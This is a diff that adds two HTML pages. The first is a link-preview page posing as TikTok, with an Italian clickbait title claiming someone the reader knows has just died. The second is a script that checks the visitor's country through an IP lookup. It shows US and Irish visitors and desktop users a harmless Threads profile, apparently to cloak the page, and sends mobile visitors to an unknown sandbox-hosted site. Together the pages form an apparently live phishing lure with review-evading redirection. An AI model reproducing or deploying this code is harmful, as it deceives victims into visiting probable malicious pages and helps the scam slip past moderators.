@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+  <meta name="facebook:card" content="summary_large_image" />
+  <meta name="facebook:description" content="tiktok" />
+  <meta name="facebook:app:country" content="US" />
+  <meta property="og:image" content="https://cdn.discordapp.com/attachments/1167226338650898492/1169712686217572472/imagenprobar.png?ex=655666d4&is=6543f1d4&hm=f115b696e71cb2990682b65e99331233a46da63b19e6e44f9c6f0f693ffa656e&" />
+  <meta property="og:title" content="È appena morto in un incidente, penso che tu lo conosca..😭"/>
+  <meta property="og:description" content="834, 835 views" />
+  <meta property="og:site_name" content="tiktok" />
+  <meta property="fb:app_id" content="87741124305" />
+ </head>
+ <body>
+ </body>
+</html>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Parker1504</title>
+    <script>
+        function redirectToDifferentWebsite() {
+            var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(navigator.userAgent.toLowerCase());
+            var mobileDevice = "https://vy8rt7.csb.app/";
+            var pcURL = "https://www.threads.net/@zuck"; 
+            var mobileURL = mobileDevice;
+            var irelandURL = "https://www.namecheap.com/myaccount/login/"; 
+            var blockedCountries = ['US', 'IE'];
+            
+           
+            fetch('https://ipinfo.io?token=74eaddd4400f3a')
+                .then(response => response.json())
+                .then(data => {
+                    var country = data.country;
+                    if (blockedCountries.includes(country)) {
+                        
+                        window.location.href = pcURL; 
+                    } else if (isMobile) {
+                        window.location.href = mobileURL;
+                    } else {
+                        if (country === 'IE') {
+                            window.location.href = irelandURL;
+                        } else {
+                            window.location.href = pcURL;
+                        }
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching IP info:', error);
+                   
+                    window.location.href = pcURL;
+                });
+        }
+    
+        redirectToDifferentWebsite();
+    </script>    
+</head>
+<body>
+</body>
+</html>
